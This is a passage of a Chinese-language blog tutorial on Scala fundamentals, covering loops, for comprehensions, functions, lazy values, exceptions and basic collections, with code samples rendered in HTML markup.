class="comment">//Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>while循环的中断</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.util.control.<span class="type">Breaks</span></span><br><span class="line"><span class="keyword">val</span> loop = <span class="keyword">new</span> <span class="type">Breaks</span></span><br><span class="line">loop.breakable&#123;</span><br><span class="line">  <span class="keyword">while</span>(n &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">    n += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">18</span>)&#123;</span><br><span class="line">      loop.<span class="keyword">break</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">println(n)</span><br></pre></td></tr></table></figure><p>Tips: Scala并没有提供break和continue语句来退出循环，如果需要break，可以通过几种方法来做1、使用Boolean型的控制变量 2、使用嵌套函数，从函数中return 3、使用Breaks对象的break方法。</p><h4 id="for表达式"><a href="#for表达式" class="headerlink" title="for表达式"></a>for表达式</h4><p>Scala也为for循环这一常见的控制结构提供了非常多的特性，这些for循环特性被称为for推导式(for comprehension)或for表达式(for expression).</p><h5 id="for示例1-to左右两边为前闭后闭的访问"><a href="#for示例1-to左右两边为前闭后闭的访问" class="headerlink" title="for示例1: to左右两边为前闭后闭的访问"></a>for示例1: to左右两边为前闭后闭的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j &lt;- <span class="number">1</span> to <span class="number">3</span>)&#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例2：until左右两边为前闭后开的访问"><a href="#for示例2：until左右两边为前闭后开的访问" class="headerlink" title="for示例2：until左右两边为前闭后开的访问"></a>for示例2：until左右两边为前闭后开的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> until <span class="number">3</span>; j &lt;- <span class="number">1</span> until <span class="number">3</span>) &#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"><a href="#for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue" class="headerlink" title="for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"></a>for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span> <span class="keyword">if</span> i != <span class="number">2</span>) &#123;</span><br><span class="line">  print(i + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例4：引入变量"><a href="#for示例4：引入变量" class="headerlink" title="for示例4：引入变量"></a>for示例4：引入变量</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j = <span class="number">4</span> - i) &#123;</span><br><span class="line">  print(j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"><a href="#for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字" class="headerlink" title="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"></a>for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> for5 = <span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">10</span>) <span class="keyword">yield</span> i</span><br><span class="line">println(for5)</span><br></pre></td></tr></table></figure><h5 id="for示例6：使用花括号-代替小括号"><a href="#for示例6：使用花括号-代替小括号" class="headerlink" title="for示例6：使用花括号{}代替小括号()"></a>for示例6：使用花括号{}代替小括号()</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">  i &lt;- <span class="number">1</span> to <span class="number">3</span></span><br><span class="line">  j = <span class="number">4</span> - i&#125;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>Tips</strong>: {}和()对于for表达式来说都可以。for 推导式有一个不成文的约定：当for<br>推导式仅包含单一表达式时使用原括号，当其包含多个表达式时使用大括号。值得注意的是，使用原括号时，早前版本的Scala 要求表达式之间必须使用分号。</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>scala定义函数的标准格式为：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">函数名</span></span>(参数名<span class="number">1</span>: 参数类型<span class="number">1</span>, 参数名<span class="number">2</span>: 参数类型<span class="number">2</span>) : 返回类型 = &#123;函数体&#125;</span><br></pre></td></tr></table></figure><p>函数示例1：返回Unit类型的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">shout1</span><span class="params">(content: String)</span> : Unit </span>= &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例2：返回Unit类型的函数，但是没有显式指定返回类型。（当然也可以返回非Unit类型的值）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout2</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例3:返回值类型有多种可能，此时也可以省略Unit</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout3</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  <span class="keyword">if</span>(content.length &gt;= <span class="number">3</span>)</span><br><span class="line">    content + <span class="string">"喵喵喵~"</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例4：带有默认值参数的函数，调用该函数时，可以只给无默认值的参数传递值，也可以都传递，新值会覆盖默认值；传递参数时如果不按照定义顺序，则可以通过参数名来指定。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout4</span></span>(content: <span class="type">String</span>, leg: <span class="type">Int</span> = <span class="number">4</span>) = &#123;</span><br><span class="line">  println(content + <span class="string">","</span> + leg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例5：变长参数（不确定个数参数，类似Java的…）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span></span>(args: <span class="type">Int</span>*) = &#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span>(arg &lt;- args)</span><br><span class="line">    result += arg</span><br><span class="line">  result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归函数：递归函数在使用时必须有明确的返回值类型</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span></span>(n: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">  <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n * factorial(n - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips:</strong></p><p>1、Scala可以通过=右边的表达式  推断出函数的返回类型。如果函数体需要多个表达式，可以用代码块{}。</p><p>2、可以把return 当做  函数版本的break语句。</p><p>3、递归函数一定要指定返回类型。</p><p>4、变长参数通过* 来指定，所有参数会转化为一个seq序列。</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>我们将函数的返回类型为Unit的函数称之为过程。</p><h5 id="定义过程示例1："><a href="#定义过程示例1：" class="headerlink" title="定义过程示例1："></a>定义过程示例1：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) : <span class="type">Unit</span> = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例2：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例3：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尖叫提示：这只是一个逻辑上的细分，如果因为该概念导致了理解上的混淆，可以暂时直接跳过过程这样的描述。毕竟过程，在某种意义上也是函数。</p><h4 id="懒值"><a href="#懒值" class="headerlink" title="懒值"></a>懒值</h4><p>当val被声明为lazy时，他的初始化将被推迟，直到我们首次对此取值，适用于初始化开销较大的场景。</p><p>lazy示例：通过lazy关键字的使用与否，来观察执行过程</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Lazy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">init</span></span>(): <span class="type">String</span> = &#123;</span><br><span class="line">    println(<span class="string">"init方法执行"</span>)</span><br><span class="line">    <span class="string">"嘿嘿嘿，我来了~"</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">lazy</span> <span class="keyword">val</span> msg = init()</span><br><span class="line">    println(<span class="string">"lazy方法没有执行"</span>)</span><br><span class="line">    println(msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>当碰到异常情况时，方法抛出一个异常，终止方法本身的执行，异常传递到其调用者，调用者可以处理该异常，也可以升级到它的调用者。运行系统会一直这样升级异常，直到有调用者能处理它。 如果一直没有处理，则终止整个程序。</p><p>Scala的异常的工作机制和Java一样，但是Scala没有“checked”异常，你不需要声明说函数或者方法可能会抛出某种异常。受检异常在编译器被检查，java必须声明方法所会抛出的异常类型。</p><p><strong>抛出异常</strong>：用throw关键字，抛出一个异常对象。所有异常都是Throwable的子类型。throw表达式是有类型的，就是Nothing，因为Nothing是所有类型的子类型，所以throw表达式可以用在需要类型的地方。</p><p><strong>捕捉异常：</strong>在Scala里，借用了模式匹配的思想来做异常的匹配，因此，在catch的代码里，是一系列case字句。</p><p>异常捕捉的机制与其他语言中一样，如果有异常发生，catch字句是按次序捕捉的。因此，在catch字句中，越具体的异常越要靠前，越普遍的异常越靠后。 如果抛出的异常不在catch字句中，该异常则无法处理，会被升级到调用者处。</p><p>finally字句用于执行不管是正常处理还是有异常发生时都需要执行的步骤，一般用于对象的清理工作。</p><h5 id="异常示例："><a href="#异常示例：" class="headerlink" title="异常示例："></a>异常示例：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ExceptionSyllabus</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">divider</span></span>(x: <span class="type">Int</span>, y: <span class="type">Int</span>): <span class="type">Float</span>= &#123;</span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">Exception</span>(<span class="string">"0作为了除数"</span>)</span><br><span class="line">    <span class="keyword">else</span> x / y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          println(divider(<span class="number">10</span>, <span class="number">3</span>))</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> ex: <span class="type">Exception</span> =&gt; println(<span class="string">"捕获了异常："</span> + ex)</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="数据结构特点"><a href="#数据结构特点" class="headerlink" title="数据结构特点"></a>数据结构特点</h4><p>Scala同时支持可变集合和不可变集合，不可变集合从不可变，可以安全的并发访问。</p><p>两个主要的包：</p><p>不可变集合：scala.collection.immutable</p><p>可变集合：  scala.collection.mutable</p><p>Scala优先采用不可变集合，对于几乎所有的集合类，Scala都同时提供了可变和不可变的版本。</p><p>不可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hebn4l8j20qa0j63zo.jpg" alt></p><p>可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hf54tkwj20xc0l0q50.jpg" alt></p><h4 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h4><h5 id="1-定长数组"><a href="#1-定长数组" class="headerlink" title="1.定长数组"></a>1.定长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">10</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">7</span></span><br><span class="line">或：</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="type">Array</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h5 id="2-变长数组"><a href="#2-变长数组" class="headerlink" title="2.变长数组"></a>2.变长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr2 = <span class="type">ArrayBuffer</span>[<span class="type">Int</span>]()</span><br><span class="line"><span class="comment">//追加值</span></span><br><span class="line">arr2.append(<span class="number">7</span>)</span><br><span class="line"><span class="comment">//重新赋值</span></span><br><span class="line">arr2(<span class="number">0</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><h5 id="3-定长数据与变长数据的装换"><a href="#3-定长数据与变长数据的装换" class="headerlink" title="3.定长数据与变长数据的装换"></a>3.定长数据与变长数据的装换</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr1.toBuffer</span><br><span class="line">arr2.toArray</span><br></pre></td></tr></table></figure><h5 id="4-多维数据"><a href="#4-多维数据" class="headerlink" title="4.多维数据"></a>4.多维数据</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr3 = <span class="type">Array</span>.ofDim[<span class="type">Double</span>](<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr3(<span class="number">1</span>)(<span class="number">1</span>) = <span class="number">11.11</span></span><br></pre></td></tr></table></figure><h5 id="5-与Java数组的互转"><a href="#5-与Java数组的互转" class="headerlink" title="5.与Java数组的互转"></a>5.与Java数组的互转</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//scala =&gt; Java</span></span><br><span class="line"><span class="keyword">val</span> arr4 = <span class="type">ArrayBuffer</span>(<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>)</span><br><span class="line"><span class="comment">//Scala to Java</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.bufferAsJavaList</span><br><span class="line"><span class="keyword">val</span> javaArr = <span class="keyword">new</span> <span class="type">ProcessBuilder</span>(arr4)</span><br><span class="line">println(javaArr.command())</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java =&gt; scala</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.asScalaBuffer</span><br><span class="line"><span class="keyword">import</span> scala.collection.mutable.<span class="type">Buffer</span></span><br><span class="line"><span class="keyword">val</span> scalaArr: <span class="type">Buffer</span>[<span class="type">String</span>] = javaArr.command()</span><br><span class="line">println(scalaArr)</span><br></pre></td></tr></table></figure><p>6.数据的遍历</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x &lt;- arr1) &#123;</span><br><span class="line">  println(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-3-元组-Tuple"><a href="#5-3-元组-Tuple" class="headerlink" title="5.3 元组 Tuple"></a>5.3 元组 Tuple</h4><p>元组可以理解为一个容器，可以存放各种相同或者不同类型的数据。</p><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> tuple1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">"heiheihei"</span>)</span><br><span class="line">println(tuple1)</span><br></pre></td></tr></table></figure><h5 id="访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0"><a href="#访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0" class="headerlink" title="访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)"></a>访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val value1 = tuple1._4</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="元组的遍历"><a href="#元组的遍历" class="headerlink" title="元组的遍历"></a>元组的遍历</h5><p><strong>方式1</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (elem &lt;- tuple1.productIterator) &#123;</span><br><span class="line">  print(elem)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>方式2</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple1.productIterator.foreach(i =&gt; println(i))</span><br><span class="line">tuple1.productIterator.foreach(print(_))</span><br></pre></td></tr></table></figure><h4 id="列表List"><a href="#列表List" class="headerlink" title="列表List"></a>列表List</h4><p>如果List列表为空，则使用Nil来表示</p><h5 id="创建List"><a href="#创建List" class="headerlink" title="创建List"></a>创建List</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list1 = <span class="type">List</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(list1)</span><br></pre></td></tr></table></figure><h5 id="访问List元素"><a href="#访问List元素" class="headerlink" title="访问List元素"></a>访问List元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> value1 = list1(<span class="number">1</span>)</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="List元素的追加"><a href="#List元素的追加" class="headerlink" title="List元素的追加"></a>List元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list2 = list1 :+ <span class="number">99</span></span><br><span class="line">println(list2)</span><br><span class="line"><span class="keyword">val</span> list3 = <span class="number">100</span> +: list1</span><br><span class="line">println(list3)</span><br></pre></td></tr></table></figure><p>List的创建与追加，符号“::”，注意观察去掉Nil和不去掉Nil的区别</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list4 = <span class="number">1</span> :: <span class="number">2</span> :: <span class="number">3</span> :: list1 :: <span class="type">Nil</span></span><br><span class="line">println(list4)</span><br></pre></td></tr></table></figure><h4 id="队列Queue"><a href="#队列Queue" class="headerlink" title="队列Queue"></a>队列Queue</h4><p>队列数据存取符合先进先出的策略</p><h5 id="队列的创建"><a href="#队列的创建" class="headerlink" title="队列的创建"></a>队列的创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.collection.mutable</span><br><span class="line"><span class="keyword">val</span> q1 = <span class="keyword">new</span> mutable.<span class="type">Queue</span>[<span class="type">Int</span>]</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="队列元素的追加"><a href="#队列元素的追加" class="headerlink" title="队列元素的追加"></a>队列元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1+=<span class="number">1</span></span><br><span class="line">print;n(q1)</span><br></pre></td></tr></table></figure><h5 id="队列的追加"><a href="#队列的追加" class="headerlink" title="队列的追加"></a>队列的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1 ++= <span class="type">List</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="按照进入队列的顺序删除元素"><a href="#按照进入队列的顺序删除元素" class="headerlink" title="按照进入队列的顺序删除元素"></a>按照进入队列的顺序删除元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1.dequeue()</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="塞入数据"><a href="#塞入数据" class="headerlink" title="塞入数据"></a>塞入数据</h5><h5 id="返回队列的第一个元素"><a href="#返回队列的第一个元素" class="headerlink" title="返回队列的第一个元素"></a>返回队列的第一个元素</h5><h5 id="返回队列的最后一个元素"><a href="#返回队列的最后一个元素" class="headerlink" title="返回队列的最后一个元素"></a>返回队列的最后一个元素</h5><h5 id="返回队列最后一个元素"><a href="#返回队列最后一个元素" class="headerlink" title="返回队列最后一个元素"></a>返回队列最后一个元素</h5><h5 id="返回除了第一个以外的元素"><a href="#返回除了第一个以外的元素" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h5 id="返回除了第一个以外的元素-1"><a href="#返回除了第一个以外的元素-1" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><h5 id="构造不可变映射"><a href="#构造不可变映射" class="headerlink" title="构造不可变映射"></a>构造不可变映射</h5><h5 id="构造可变映射"><a href="#构造可变映射" class="headerlink" title="构造可变映射"></a>构造可变映射</h5><h5 id="空的映射"><a href="#空的映射" class="headerlink" title="空的映射"></a>空的映射</h5><h5 id="对偶元组"><a href="#对偶元组" class="headerlink" title="对偶元组"></a>对偶元组</h5><h5 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h5><h5 id="更新值"><a href="#更新值" class="headerlink" title="更新值"></a>更新值</h5><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><h4 id="集-Set"><a href="#集-Set" class="headerlink" title="集 Set"></a>集 Set</h4><h5 id="1-Set不可变集合的创建"><a href="#1-Set不可变集合的创建" class="headerlink" title="1.Set不可变集合的创建"></a>1.Set不可变集合的创建</h5><h5 id="2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"><a href="#2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合" class="headerlink" title="2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"></a>2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合</h5><h5 id="3-可变集合的元素添加"><a href="#3-可变集合的元素添加" class="headerlink" title="3.可变集合的元素添加"></a>3.可变集合的元素添加</h5><h5 id="4-可变集合的元素删除"><a href="#4-可变集合的元素删除" class="headerlink" title="4.可变集合的元素删除"></a>4.可变集合的元素删除</h5><h5 id="5-遍历"><a href="#5-遍历" class="headerlink" title="5.遍历"></a>5.遍历</h5><h5 id="6-Set更多常用操作"><a href="#6-Set更多常用操作" class="headerlink" title="6.Set更多常用操作"></a>6.Set更多常用操作</h5><h4 id="集合元素与函数的映射"><a href="#集合元素与函数的映射" class="headerlink" title="集合元素与函数的映射"></a>集合元素与函数的映射</h4><h5 id="map"><a href="#map" class="headerlink" 